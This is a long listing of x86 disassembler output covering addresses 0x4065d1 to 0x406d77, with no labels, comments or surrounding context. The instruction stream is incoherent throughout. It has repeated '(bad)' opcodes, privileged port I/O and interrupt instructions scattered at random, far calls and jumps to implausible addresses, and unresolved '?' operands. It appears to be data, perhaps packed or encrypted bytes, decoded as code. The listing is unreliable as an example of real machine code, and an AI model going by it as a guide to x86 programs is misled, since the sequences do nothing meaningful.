  4065d1:	xlat   BYTE PTR ds:[ebx]
  4065d2:	mov    ds:0x9f1b5663,al
  4065d7:	shr    ch,0x1
  4065da:	fiadd  DWORD PTR [eax]
  4065dc:	mov    al,ds:0x349c0bef
  4065e1:	adc    DWORD PTR [ecx+0x5884d0af],0x39
  4065e8:	or     BYTE PTR ds:0xfe0ebeca,cl
  4065ee:	push   0x681312d3
  4065f3:	xchg   esp,eax
  4065f4:	sti    
  4065f5:	idiv   DWORD PTR [ebx]
  4065f7:	leave  
  4065f8:	(bad)  
  4065fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4065fb:	inc    esi
  4065fc:	pop    edx
  4065fd:	je     0x40662d
  4065ff:	jno    0x4065b3
  406601:	sub    al,BYTE PTR [esi-0x1]
  406604:	jl     0x4065f3
  406606:	call   DWORD PTR ds:0x1f66d1cd
  40660c:	es into 
  40660e:	mov    BYTE PTR [ebx],dh
  406610:	fs mov edi,0x2b7a2f68
  406616:	test   BYTE PTR [esi+0x20540a46],0xb0
  40661d:	fucomp st(0)
  40661f:	neg    BYTE PTR [ecx-0x40]
  406622:	ds (bad) 
  406625:	fild   QWORD PTR [ecx-0x12]
  406628:	push   ecx
  406629:	dec    edx
  40662a:	rcl    DWORD PTR [edx+edi*2-0x7bd7839f],cl
  406631:	lods   al,BYTE PTR ds:[esi]
  406632:	jb     0x406690
  406634:	mov    edx,0x4c660bac
  406639:	enter  0xf573,0xcc
  40663d:	shr    al,1
  40663f:	sbb    DWORD PTR [ebx-0x35],0xffffff9e
  406643:	mov    DWORD PTR [ecx+esi*2+0x9d1ed59],ebx
  40664a:	loope  0x4066a0
  40664c:	iret   
  40664d:	cmp    eax,0x92d43b09
  406652:	mov    WORD PTR [eax-0x51883b97],es
  406658:	psrad  mm5,QWORD PTR [eax]
  40665b:	sar    BYTE PTR [edx],cl
  40665d:	mov    ch,0xed
  40665f:	imul   ecx,DWORD PTR [edx],0xddcb64e9
  406665:	test   esp,ecx
  406667:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406668:	dec    ebp
  406669:	dec    edx
  40666a:	push   ebp
  40666b:	and    eax,0xa9181416
  406670:	out    0x76,al
  406672:	pusha  
  406673:	push   ecx
  406674:	stc    
  406675:	ret    
  406676:	xor    ah,ah
  406678:	mov    DWORD PTR [eax+0x7a],ebx
  40667b:	mov    BYTE PTR [edx+0x4ac3a74],bh
  406681:	xor    BYTE PTR [edx-0x5c],0x62
  406685:	add    al,ah
  406687:	call   0xcaa1:0x11742352
  40668e:	pop    esi
  40668f:	mov    dl,0x25
  406691:	dec    ebp
  406692:	xor    ch,BYTE PTR [ebx+0x1c]
  406695:	sub    ebx,edi
  406697:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406699:	push   esp
  40669a:	xor    ebx,edx
  40669c:	inc    esp
  40669d:	or     al,0xdd
  40669f:	repz cdq 
  4066a1:	xor    al,0x37
  4066a3:	in     eax,0x88
  4066a5:	shl    BYTE PTR [eax-0x78],0xe5
  4066a9:	xchg   ebx,eax
  4066aa:	inc    ecx
  4066ab:	jl     0x40669b
  4066ad:	add    esi,DWORD PTR [edi-0x3a960871]
  4066b3:	inc    edi
  4066b4:	cmp    eax,0x6135f364
  4066b9:	sub    dh,BYTE PTR [edx+edi*1]
  4066bc:	add    edx,DWORD PTR [esi]
  4066be:	scas   al,BYTE PTR es:[edi]
  4066bf:	pop    esp
  4066c0:	ret    
  4066c1:	mov    ch,0xa5
  4066c3:	mov    ecx,?
  4066c5:	adc    ebp,DWORD PTR [eax]
  4066c7:	icebp  
  4066c8:	mov    ch,0xf8
  4066ca:	adc    al,0x82
  4066cc:	xchg   edx,eax
  4066cd:	pop    ss
  4066ce:	pusha  
  4066cf:	bound  ebp,QWORD PTR ds:0xfb66459c
  4066d5:	in     eax,dx
  4066d6:	inc    eax
  4066d7:	sbb    BYTE PTR fs:[eax],0x42
  4066db:	xchg   edi,eax
  4066dc:	cmp    edx,DWORD PTR [edx-0x58bd6f35]
  4066e2:	cdq    
  4066e3:	lods   al,BYTE PTR ds:[esi]
  4066e4:	test   al,0x93
  4066e6:	mov    al,ds:0x684d3866
  4066eb:	aaa    
  4066ec:	lahf   
  4066ed:	ror    BYTE PTR [esi],1
  4066ef:	sbb    al,0xef
  4066f1:	pop    ecx
  4066f2:	fucomip st,st(5)
  4066f4:	sub    al,0xbc
  4066f6:	mov    eax,0xf780e03a
  4066fb:	outs   dx,DWORD PTR ds:[esi]
  4066fc:	retf   
  4066fd:	dec    ecx
  4066fe:	out    dx,al
  4066ff:	daa    
  406700:	add    ah,dl
  406702:	adc    DWORD PTR [ebp+0x331b635f],edx
  406708:	int3   
  406709:	mov    dl,0xaa
  40670b:	les    esi,FWORD PTR [edx+0x7ab2ec1d]
  406711:	pop    ebx
  406712:	lahf   
  406713:	pop    edi
  406714:	dec    ebx
  406715:	add    al,0xb8
  406717:	jne    0x4066e3
  406719:	pop    ebp
  40671a:	je     0x406783
  40671c:	in     al,0x89
  40671e:	cs jmp 0xf01afc1f
  406724:	loope  0x406714
  406726:	jo     0x4066cb
  406728:	test   al,0x11
  40672a:	arpl   WORD PTR [ebp+0x51],bp
  40672d:	ret    
  40672e:	jmp    0xc092a326
  406733:	(bad)  
  406734:	ss pop ecx
  406736:	in     eax,0x25
  406738:	rcl    bh,1
  40673a:	sbb    al,0xa1
  40673c:	inc    esp
  40673d:	or     al,0x9e
  40673f:	jecxz  0x406776
  406741:	mov    esp,0xde46cdb3
  406746:	inc    esp
  406747:	stos   DWORD PTR es:[edi],eax
  406748:	adc    ch,ah
  40674a:	rcl    DWORD PTR [esi],1
  40674c:	les    edi,FWORD PTR [edx+0x46]
  40674f:	pusha  
  406750:	imul   DWORD PTR [eax-0x9ee644f]
  406756:	xor    DWORD PTR [ecx-0x4a],edi
  406759:	sbb    eax,0x9f581357
  40675e:	cmp    esp,DWORD PTR [ebx+0x4fd5b285]
  406764:	and    ecx,eax
  406766:	adc    al,0x1c
  406768:	inc    esp
  406769:	xchg   esp,eax
  40676a:	sahf   
  40676b:	mov    DWORD PTR [ecx+0x37],edi
  40676e:	ret    
  40676f:	push   0xffffff94
  406771:	outs   dx,BYTE PTR ds:[esi]
  406772:	mov    esp,0x1e9e7eeb
  406777:	les    eax,FWORD PTR [edi+0x4f]
  40677a:	ror    BYTE PTR [ebx+0x53],1
  40677d:	cs jns 0x4067f0
  406780:	retf   0x83d1
  406783:	popf   
  406784:	add    al,dh
  406786:	jns    0x406805
  406788:	xor    al,0x4b
  40678a:	and    edx,DWORD PTR [ecx+edi*8-0x4671ac7b]
  406791:	mov    al,ds:0xd692aae1
  406796:	and    eax,DWORD PTR [ebx+0x37]
  406799:	mov    al,0xf6
  40679b:	popa   
  40679c:	dec    esi
  40679d:	adc    eax,0x355b9e37
  4067a2:	adc    edi,edx
  4067a4:	mov    esp,0x4998e5
  4067a9:	(bad)  
  4067aa:	jno    0x4067a2
  4067ac:	dec    ebp
  4067ad:	mov    eax,0xb3b6ac99
  4067b2:	cmp    BYTE PTR [ebp+0x4b],0x67
  4067b6:	les    ebp,FWORD PTR [ebx]
  4067b8:	repz add dh,BYTE PTR [eax+edx*1-0x7c44150c]
  4067c0:	hlt    
  4067c1:	jecxz  0x40675b
  4067c3:	xor    DWORD PTR [ebx+0x7b],edx
  4067c6:	push   ss
  4067c7:	cld    
  4067c8:	inc    ecx
  4067c9:	sub    al,0xe9
  4067cb:	add    edi,DWORD PTR [esi]
  4067cd:	enter  0xf290,0xcc
  4067d1:	stc    
  4067d2:	sar    DWORD PTR [ecx-0x20d8dfde],1
  4067d8:	dec    edx
  4067d9:	inc    ecx
  4067da:	and    DWORD PTR [esi],ebp
  4067dc:	int    0xe8
  4067de:	add    ah,dl
  4067e0:	cli    
  4067e1:	callw  0xc324
  4067e5:	sub    eax,0x29f6c29c
  4067ea:	push   ecx
  4067eb:	stc    
  4067ec:	out    0x15,al
  4067ee:	xor    cl,dl
  4067f0:	ret    
  4067f1:	lea    ebx,[eax-0x8]
  4067f4:	push   esp
  4067f5:	test   eax,0x1a459206
  4067fa:	add    dh,BYTE PTR [ebx-0x77]
  4067fd:	mov    ah,0x39
  4067ff:	or     al,0x97
  406801:	lods   eax,DWORD PTR ds:[esi]
  406802:	xchg   edx,ecx
  406804:	push   es
  406805:	cmp    eax,0x9a110157
  40680a:	fcmovbe st,st(2)
  40680c:	cli    
  40680d:	test   BYTE PTR [ebx],bl
  40680f:	test   DWORD PTR [eax],0xf6983217
  406815:	pop    ss
  406816:	int    0xb1
  406818:	fdiv   QWORD PTR [ecx-0x14]
  40681c:	inc    esi
  40681d:	mov    al,cl
  40681f:	call   0x306a:0x2a6abc47
  406826:	sar    DWORD PTR [ebp-0x23093222],1
  40682c:	mov    ?,eax
  40682e:	sub    al,0x5
  406830:	sub    al,0x25
  406832:	mov    edi,0x5695b841
  406837:	lock push esi
  406839:	sub    ebp,ebx
  40683b:	pop    esp
  40683c:	ret    
  40683d:	xchg   ecx,eax
  40683e:	test   al,0x7c
  406840:	and    BYTE PTR [edi-0x1f5e9db1],ch
  406846:	add    ecx,0x4d7f18cb
  40684c:	inc    ebx
  40684d:	aas    
  40684e:	(bad)  
  40684f:	sub    al,0xc8
  406851:	outs   dx,BYTE PTR ds:[esi]
  406852:	rol    al,1
  406854:	in     eax,0x21
  406856:	test   eax,0x9e7c4506
  40685b:	add    eax,DWORD PTR [eax]
  40685d:	jb     0x406827
  40685f:	jae    0x406801
  406861:	mov    dh,0x5b
  406863:	lahf   
  406864:	add    al,0x4d
  406866:	cs in  al,0xee
  406869:	out    0x1e,eax
  40686b:	xchg   edi,eax
  40686c:	jne    0x406830
  40686e:	add    ch,ah
  406870:	das    
  406871:	adc    eax,0x2e85ccd3
  406876:	inc    edi
  406877:	in     eax,dx
  406878:	cmp    ebp,DWORD PTR [edx+0x19]
  40687b:	dec    edx
  40687c:	fcmovnb st,st(4)
  40687e:	retf   0x5a65
  406881:	test   eax,0xc670ee71
  406886:	loopne 0x4068ad
  406888:	test   al,0xa7
  40688a:	cs push 0xffffff8a
  40688d:	mov    al,ds:0xc528b811
  406892:	das    
  406893:	mov    ?,WORD PTR ds:[ecx-0x249aa4d9]
  40689a:	add    BYTE PTR [eax-0x2ea6f231],dl
  4068a0:	rcl    DWORD PTR [ecx-0x475f4635],cl
  4068a6:	mov    ecx,0xd633ee60
  4068ab:	(bad)  
  4068ac:	cld    
  4068ad:	pushf  
  4068ae:	inc    ecx
  4068af:	repnz clc 
  4068b1:	clc    
  4068b2:	lea    esp,[edi+0x54c029fb]
  4068b8:	sub    ah,BYTE PTR [edx+0x61]
  4068bb:	sub    DWORD PTR [esp+eax*2],edi
  4068be:	scas   al,BYTE PTR es:[edi]
  4068bf:	inc    edi
  4068c0:	pop    esp
  4068c1:	mov    al,ds:0xe1b5f3c1
  4068c6:	xlat   BYTE PTR ds:[ebx]
  4068c7:	daa    
  4068c8:	imul   ecx,ecx,0x2c
  4068cb:	pop    ecx
  4068cc:	mov    BYTE PTR [eax+0x2b],cl
  4068cf:	inc    ebx
  4068d0:	aas    
  4068d1:	test   eax,0xdc0669f1
  4068d6:	cwde   
  4068d7:	mov    al,0x2b
  4068d9:	mov    ebp,0x7ebe8411
  4068de:	outs   dx,DWORD PTR ds:[esi]
  4068df:	mov    ebp,0xf37c8d22
  4068e4:	popf   
  4068e5:	inc    eax
  4068e6:	sbb    eax,0x1d8519e8
  4068eb:	xor    BYTE PTR [ecx],dl
  4068ed:	mov    dh,BYTE PTR [ebx-0x416bdd93]
  4068f3:	jo     0x4068be
  4068f5:	(bad)  
  4068f6:	outs   dx,DWORD PTR fs:[esi]
  4068f8:	mov    cl,0x2
  4068fa:	adc    eax,0xf8057786
  4068ff:	ficomp DWORD PTR [ebx]
  406901:	adc    BYTE PTR [eax+0x2e],0x34
  406905:	retf   
  406906:	repz sbb eax,0xcf8213e7
  40690c:	inc    esi
  40690d:	cmc    
  40690e:	(bad)  
  40690f:	in     eax,dx
  406910:	ret    0x6b6c
  406913:	xchg   ecx,eax
  406914:	out    dx,eax
  406915:	mov    esi,0x520046e7
  40691a:	mov    edi,0x5ac44afb
  40691f:	push   edi
  406920:	lds    edi,FWORD PTR [edi-0x53eaf045]
  406926:	inc    ebx
  406927:	jle    0x406987
  406929:	pop    eax
  40692a:	ret    
  40692b:	popf   
  40692c:	add    BYTE PTR [eax],dh
  40692e:	call   0xe06e:0xd4549c5f
  406935:	addr16 push ebp
  406937:	adc    ebp,0xffffffba
  40693a:	ret    0x8109
  40693d:	sub    eax,0xb281a88d
  406942:	sti    
  406943:	xlat   BYTE PTR ds:[ebx]
  406944:	(bad)  
  406945:	ror    BYTE PTR [eax],0x9e
  406948:	xor    esp,DWORD PTR [esi]
  40694a:	push   cs
  40694b:	and    BYTE PTR [ecx-0x1c5dd5cb],al
  406951:	ja     0x406909
  406953:	arpl   di,bx
  406955:	jno    0x40696f
  406957:	add    BYTE PTR [edx],bl
  406959:	ret    0xe7ef
  40695c:	cs out 0x49,al
  40695f:	pop    edx
  406960:	out    0xd8,eax
  406962:	dec    eax
  406963:	jbe    0x40691b
  406965:	or     ch,BYTE PTR [eax]
  406967:	pop    edi
  406968:	add    BYTE PTR [ebx-0x32b0df49],bh
  40696e:	xor    eax,0x68925cca
  406973:	test   BYTE PTR [ebx+edi*2-0x70],0xda
  406978:	xchg   BYTE PTR [eax],ah
  40697a:	mov    al,BYTE PTR [ecx+0x3531e2ff]
  406980:	test   al,0x48
  406982:	xchg   esp,eax
  406983:	(bad)  
  406984:	sub    DWORD PTR [esi+edi*8-0x2],ecx
  406988:	mov    cl,0x73
  40698a:	data16 stos BYTE PTR es:[edi],al
  40698c:	jae    0x4069d1
  40698e:	gs pop eax
  406990:	cwde   
  406991:	xchg   edi,eax
  406992:	inc    edi
  406993:	push   cs
  406994:	mov    dl,0x43
  406996:	bound  eax,QWORD PTR [esi-0x7b]
  406999:	or     esp,edx
  40699b:	retf   0xb97b
  40699e:	jb     0x40698c
  4069a0:	xchg   DWORD PTR [ebx+0x4c6e7688],ebp
  4069a6:	and    ebp,DWORD PTR [esi+eax*2+0x11]
  4069aa:	jae    0x406968
  4069ac:	mov    dh,0x7c
  4069ae:	mov    cl,0x46
  4069b0:	popf   
  4069b1:	xor    DWORD PTR [edi],0x104a5922
  4069b7:	xchg   DWORD PTR [ecx-0xf27b9dd],ebp
  4069bd:	and    DWORD PTR [ebx],ecx
  4069bf:	ins    DWORD PTR es:[edi],dx
  4069c0:	adc    ecx,DWORD PTR [eax+0x2451bc2a]
  4069c6:	xor    eax,0x14b97547
  4069cb:	sbb    al,0x84
  4069cd:	mov    ds:0x86b43ea7,al
  4069d2:	and    cl,BYTE PTR [ecx-0x4a6d9831]
  4069d8:	lods   al,BYTE PTR ds:[esi]
  4069d9:	mov    ds:0x54f9b665,eax
  4069de:	fist   WORD PTR [edi-0x13]
  4069e1:	cs jge 0x406979
  4069e4:	add    DWORD PTR [edx+ebp*4-0x3a],ebx
  4069e8:	inc    edx
  4069e9:	xchg   edx,eax
  4069ea:	arpl   WORD PTR [ebp+0x56],bx
  4069ed:	(bad)  
  4069ee:	ins    BYTE PTR es:[edi],dx
  4069ef:	inc    ecx
  4069f0:	dec    esi
  4069f1:	add    DWORD PTR ds:[ebx+0x5a0c61cc],ecx
  4069f8:	mov    esi,0x9248b097
  4069fd:	sbb    BYTE PTR [eax+0x876f15f],bh
  406a03:	mov    ebp,0xff53dca5
  406a08:	ss ds push cs
  406a0b:	push   es
  406a0c:	not    BYTE PTR [esi-0x2bb4aafd]
  406a12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a13:	pusha  
  406a14:	xor    al,0x6b
  406a16:	test   edx,eax
  406a18:	add    BYTE PTR [edi+0x64],dl
  406a1b:	gs fwait
  406a1d:	das    
  406a1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a1f:	pop    ds
  406a20:	add    DWORD PTR [ebp+0x31],ecx
  406a23:	adc    ecx,DWORD PTR [ebp-0x80]
  406a26:	add    dl,BYTE PTR [ecx+0x477655af]
  406a2c:	ror    BYTE PTR [ecx],1
  406a2e:	(bad)  
  406a2f:	sbb    al,0xd3
  406a31:	fsub   DWORD PTR [ebp+0x34e3b6f]
  406a37:	shl    BYTE PTR [edi+0xd],cl
  406a3a:	adc    bl,0x55
  406a3d:	mov    bl,0x22
  406a3f:	add    BYTE PTR [edx+ebx*1-0x32c4c1a2],cl
  406a46:	(bad)  
  406a47:	jnp    0x4069cb
  406a49:	jle    0x406a45
  406a4b:	mov    ecx,0xa17ac3a8
  406a50:	jg     0x4069dd
  406a52:	add    esp,ecx
  406a54:	mov    esp,0x56cbf8eb
  406a59:	call   0x1d67:0x8916c50f
  406a60:	out    dx,al
  406a61:	jnp    0x406aa6
  406a63:	enter  0xc860,0x3e
  406a67:	mov    esi,0x9794574f
  406a6c:	mov    cl,0x9c
  406a6e:	cli    
  406a6f:	ins    BYTE PTR es:[edi],dx
  406a70:	mov    bh,0x10
  406a72:	lds    esp,FWORD PTR ds:0x6c0358f4
  406a78:	ret    0xda1b
  406a7b:	mov    BYTE PTR [ebp-0x4e],dh
  406a7e:	lock sub esi,DWORD PTR [ebp-0x4f]
  406a82:	adc    al,0x72
  406a84:	push   es
  406a85:	dec    esi
  406a86:	lea    esi,[edx]
  406a88:	jl     0x406a86
  406a8a:	pop    ebx
  406a8b:	pop    ss
  406a8c:	pop    edx
  406a8d:	lods   eax,DWORD PTR ds:[esi]
  406a8e:	shl    BYTE PTR [ebp+ebx*8-0x23],0xd1
  406a93:	das    
  406a94:	sub    al,0x1b
  406a96:	fs jno 0x406ae1
  406a99:	inc    ebx
  406a9a:	outs   dx,BYTE PTR ds:[esi]
  406a9b:	adc    al,0x95
  406a9d:	xlat   BYTE PTR ds:[ebx]
  406a9e:	ds sahf 
  406aa0:	lods   al,BYTE PTR ds:[esi]
  406aa1:	outs   dx,BYTE PTR ds:[esi]
  406aa2:	(bad)  
  406aa3:	and    ch,BYTE PTR [esi+0x17]
  406aa6:	rol    BYTE PTR ds:0xd5aff3bd,0x56
  406aad:	gs retf 0xd950
  406ab1:	push   ds
  406ab2:	jmp    0xfb3a:0xdb0c444c
  406ab9:	and    BYTE PTR [esi+esi*8],bl
  406abc:	pop    esi
  406abd:	test   BYTE PTR [edx+0x68931f95],ch
  406ac3:	sub    eax,0xa16dd511
  406ac8:	fist   WORD PTR [ecx-0x7600cb82]
  406ace:	cli    
  406acf:	mov    ds:0x9db961f2,eax
  406ad4:	js     0x406a9a
  406ad6:	daa    
  406ad7:	(bad)  
  406ad9:	jmp    0xf037:0x18c0058c
  406ae0:	pop    edx
  406ae1:	test   DWORD PTR ds:0x64dceae0,esi
  406ae7:	sbb    eax,0x15d9164
  406aec:	aam    0xdb
  406aee:	cli    
  406aef:	add    BYTE PTR [eax],ch
  406af1:	sub    DWORD PTR [esi-0x1c39991a],ecx
  406af7:	sti    
  406af8:	out    0x79,al
  406afa:	dec    edx
  406afb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406afc:	fdiv   DWORD PTR [edx+ebp*1]
  406aff:	pop    edi
  406b00:	sub    BYTE PTR [edx-0x38],0x5d
  406b04:	push   0xd6d5876
  406b09:	sub    esi,DWORD PTR [edx-0x38]
  406b0c:	push   ecx
  406b0d:	cld    
  406b0e:	push   0xfffffffb
  406b10:	xchg   dl,al
  406b12:	mov    ah,0x19
  406b14:	mov    ?,WORD PTR [ecx]
  406b16:	mov    ah,0xf2
  406b18:	cld    
  406b19:	clc    
  406b1a:	pop    es
  406b1b:	scas   eax,DWORD PTR es:[edi]
  406b1c:	in     al,dx
  406b1d:	(bad)  
  406b1e:	call   0xe90437ba
  406b23:	mov    al,BYTE PTR [edx]
  406b25:	test   DWORD PTR ds:0xae91ae09,eax
  406b2b:	jno    0x406bac
  406b2d:	nop
  406b2e:	loop   0x406b20
  406b30:	clc    
  406b31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b32:	jae    0x406b3d
  406b34:	enter  0xcc70,0x7a
  406b38:	out    0xa9,al
  406b3a:	mov    WORD PTR [edx+0x43],?
  406b3d:	push   0xffffffcb
  406b3f:	pop    eax
  406b40:	ins    DWORD PTR es:[edi],dx
  406b41:	icebp  
  406b42:	push   esi
  406b43:	xchg   DWORD PTR [edx+0x402973e2],edx
  406b49:	or     al,0x65
  406b4b:	xor    al,0xbe
  406b4d:	scas   eax,DWORD PTR es:[edi]
  406b4e:	xchg   BYTE PTR [edx],dh
  406b50:	js     0x406b4a
  406b52:	adc    eax,0x8a5d17b1
  406b57:	jl     0x406b78
  406b59:	mov    WORD PTR [ebx],?
  406b5b:	lahf   
  406b5c:	pop    esp
  406b5d:	mov    bl,0xfa
  406b5f:	lods   al,BYTE PTR ds:[esi]
  406b60:	icebp  
  406b61:	adc    al,0xb3
  406b63:	pop    esi
  406b64:	push   0xffffff86
  406b66:	push   esp
  406b67:	dec    esp
  406b68:	clc    
  406b69:	mov    ss,WORD PTR [edi]
  406b6b:	jecxz  0x406bda
  406b6d:	ret    
  406b6e:	(bad)  
  406b6f:	jmp    0x6846a837
  406b74:	push   ecx
  406b75:	mov    es,WORD PTR [esi+edi*2+0x57]
  406b79:	sbb    al,0x97
  406b7b:	xor    al,BYTE PTR [edi-0x85b8739]
  406b81:	or     al,0x64
  406b83:	mov    DWORD PTR [ecx-0x2d],ebx
  406b86:	cdq    
  406b87:	daa    
  406b88:	pop    edi
  406b89:	int    0x27
  406b8b:	mov    al,ds:0x4350c378
  406b90:	pop    es
  406b91:	test   al,0xb1
  406b93:	test   al,0x4f
  406b95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b96:	dec    eax
  406b97:	adc    eax,0xa818dcda
  406b9c:	inc    esi
  406b9d:	mov    ebx,0x7ac2e67e
  406ba2:	mov    ebp,edi
  406ba4:	pop    ebp
  406ba5:	mov    bl,0x28
  406ba7:	mov    edx,0xa044dc56
  406bac:	mov    edx,ebx
  406bae:	pop    ebp
  406baf:	mov    dh,0x2
  406bb1:	ds fwait
  406bb3:	cmp    ecx,DWORD PTR [esi-0x4e]
  406bb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406bb7:	xor    al,0x4f
  406bb9:	in     al,dx
  406bba:	mov    edi,0xea624a9a
  406bbf:	xor    ah,ah
  406bc1:	stos   BYTE PTR es:[edi],al
  406bc2:	push   ss
  406bc3:	cmp    dh,dl
  406bc5:	sbb    ch,bl
  406bc7:	jbe    0x406c27
  406bc9:	pop    ebx
  406bca:	adc    eax,0x3fc83d11
  406bcf:	sub    DWORD PTR gs:0x68493e9b,ebp
  406bd6:	jecxz  0x406c20
  406bd8:	mov    ecx,0xf50e0423
  406bdd:	xor    ah,BYTE PTR [edi]
  406bdf:	pop    edx
  406be0:	call   DWORD PTR [ecx+0x4e45d48e]
  406be6:	das    
  406be7:	mov    al,BYTE PTR [ebp+0x55]
  406bea:	popf   
  406beb:	out    dx,eax
  406bec:	frstor [eax]
  406bee:	(bad)  
  406bef:	mov    ch,0x49
  406bf2:	clc    
  406bf3:	xchg   ebx,eax
  406bf4:	cmp    edx,eax
  406bf6:	xchg   esi,eax
  406bf7:	jg     0x406bc5
  406bf9:	inc    edi
  406bfa:	adc    dh,BYTE PTR [ebx-0x5a0ac069]
  406c00:	inc    esp
  406c01:	and    cl,BYTE PTR [esi-0x2b4077ca]
  406c07:	cmp    ah,BYTE PTR [ecx]
  406c09:	pop    ebp
  406c0a:	(bad)  
  406c0b:	push   ss
  406c0c:	shl    cl,cl
  406c0e:	jmp    0x7735d7ab
  406c13:	add    edx,ecx
  406c15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c16:	(bad)  
  406c17:	jle    0x406bd1
  406c19:	and    al,BYTE PTR [edi]
  406c1b:	daa    
  406c1c:	dec    edx
  406c1d:	popf   
  406c1e:	sar    ebp,cl
  406c20:	inc    eax
  406c21:	inc    edx
  406c22:	add    al,0xd6
  406c24:	push   ebx
  406c25:	add    eax,DWORD PTR [ebx-0x3b]
  406c28:	dec    esi
  406c29:	int3   
  406c2a:	mov    ebp,0xbef6ad1e
  406c2f:	adc    BYTE PTR [edi],ah
  406c31:	add    al,0xd1
  406c33:	cmp    eax,0xcc22d107
  406c38:	adc    dh,0x98
  406c3b:	push   ebx
  406c3c:	mov    ch,0x55
  406c3e:	je     0x406c5d
  406c40:	mov    dl,0x85
  406c42:	(bad)  
  406c43:	jnp    0x406c7a
  406c45:	repnz xchg esi,eax
  406c47:	in     eax,0xe2
  406c49:	and    DWORD PTR [eax],edx
  406c4b:	mov    bl,0xfc
  406c4d:	fwait
  406c4e:	pop    esp
  406c4f:	sub    BYTE PTR [esi-0x10],ah
  406c52:	mov    ebp,0x93ab042b
  406c57:	jge    0x406c9d
  406c59:	out    dx,eax
  406c5a:	mov    bl,0xe7
  406c5c:	int3   
  406c5d:	push   es
  406c5e:	js     0x406c3a
  406c60:	and    al,0xc7
  406c62:	dec    ecx
  406c63:	ins    DWORD PTR es:[edi],dx
  406c64:	xor    DWORD PTR [ebx+0x2759a7a8],esi
  406c6a:	push   edx
  406c6b:	cld    
  406c6c:	push   ss
  406c6d:	popa   
  406c6e:	lds    edi,FWORD PTR [eax]
  406c70:	lock pushf 
  406c72:	mov    ch,0x0
  406c74:	popf   
  406c75:	je     0x406cf3
  406c77:	jmp    0xa1b5:0x2dd64cdf
  406c7e:	das    
  406c7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c80:	push   eax
  406c81:	dec    edi
  406c82:	loop   0x406ce7
  406c84:	xchg   ebx,eax
  406c85:	xchg   esi,eax
  406c86:	pop    esi
  406c87:	push   ds
  406c88:	jecxz  0x406c38
  406c8a:	call   0xf9cfdecc
  406c8f:	sbb    eax,0x426cd563
  406c94:	hlt    
  406c95:	sub    esi,DWORD PTR [ebp-0x7fe9c935]
  406c9b:	mov    bl,0x31
  406c9d:	iret   
  406c9e:	xor    esi,DWORD PTR [ebp-0x77]
  406ca1:	push   esp
  406ca2:	mul    BYTE PTR [ebx+0x61]
  406ca5:	jge    0x406d17
  406ca7:	in     eax,0x6f
  406ca9:	xlat   BYTE PTR ds:[ebx]
  406caa:	add    esi,DWORD PTR [ecx+0x77]
  406cad:	inc    edi
  406cae:	xor    eax,0xd20b5d7a
  406cb3:	jl     0x406cbd
  406cb5:	cld    
  406cb6:	dec    ebx
  406cb7:	out    0xc7,al
  406cb9:	add    DWORD PTR [esp+eax*8],edx
  406cbc:	loop   0x406c5b
  406cbe:	pop    edx
  406cbf:	nop
  406cc0:	fmul   st(3),st
  406cc2:	mov    al,ds:0x8a1d54d1
  406cc7:	sbb    al,BYTE PTR [eax+0x20]
  406cca:	(bad)  
  406ccc:	push   ss
  406ccd:	in     eax,0xba
  406ccf:	pop    esp
  406cd0:	mov    ds:0x7b42c62a,al
  406cd5:	pop    ebx
  406cd6:	fcomp  st(7)
  406cd8:	daa    
  406cd9:	repz rcl BYTE PTR [ebx],0x10
  406cdd:	jmp    0xd27eeeca
  406ce2:	stos   DWORD PTR es:[edi],eax
  406ce3:	xchg   esi,eax
  406ce4:	js     0x406d21
  406ce6:	ds mov eax,0x23eef14e
  406cec:	aad    0xab
  406cee:	lods   al,BYTE PTR ds:[esi]
  406cef:	add    BYTE PTR [edx-0x4c],al
  406cf2:	xlat   BYTE PTR ds:[ebx]
  406cf3:	jno    0x406caa
  406cf5:	cmp    eax,0x82d3e271
  406cfa:	xchg   ecx,eax
  406cfb:	repz fidivr DWORD PTR [edi+0x1a]
  406cff:	fnsave [ecx]
  406d01:	or     eax,0xf76723ca
  406d06:	ficomp WORD PTR [esi]
  406d08:	shl    DWORD PTR [ebx-0x64],cl
  406d0b:	pop    edi
  406d0c:	sub    DWORD PTR [edi-0x19],esi
  406d0f:	loop   0x406d7b
  406d11:	(bad)  [ecx]
  406d13:	aaa    
  406d14:	adc    eax,0xe69e38ed
  406d19:	imul   ecx,DWORD PTR [ebp+0x1b],0x7
  406d1d:	cdq    
  406d1e:	mov    ds:0x1222e39f,al
  406d23:	push   ss
  406d24:	ja     0x406cc2
  406d26:	mov    esp,0x2160ee0a
  406d2b:	sub    esi,DWORD PTR [edi]
  406d2d:	mov    esp,0xb920668f
  406d32:	adc    dh,ch
  406d34:	jge    0x406cc9
  406d36:	xor    eax,esp
  406d38:	cwde   
  406d39:	lods   eax,DWORD PTR ds:[esi]
  406d3a:	call   0xd117:0xfc422781
  406d41:	jge    0x406d31
  406d43:	imul   sp,WORD PTR cs:[edx],0x33
  406d48:	sub    ecx,DWORD PTR [ecx]
  406d4a:	daa    
  406d4b:	loop   0x406d6f
  406d4d:	xor    eax,0xa89be0f5
  406d52:	pop    ecx
  406d53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d54:	mov    al,0xa9
  406d56:	addr16 push ebp
  406d58:	or     BYTE PTR [ebx-0x4],al
  406d5b:	or     ebp,DWORD PTR [ebx+0xa]
  406d5e:	ret    0xe22
  406d61:	mov    BYTE PTR [ebp+0xb],dh
  406d64:	cmp    dh,bl
  406d66:	sub    DWORD PTR ds:0x69e1f7bc,edi
  406d6c:	cwde   
  406d6d:	out    dx,eax
  406d6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d6f:	test   al,0xc3
  406d71:	mov    bl,0x6e
  406d73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d74:	shr    BYTE PTR [edx],1
  406d76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d77:	jo     0x406d00
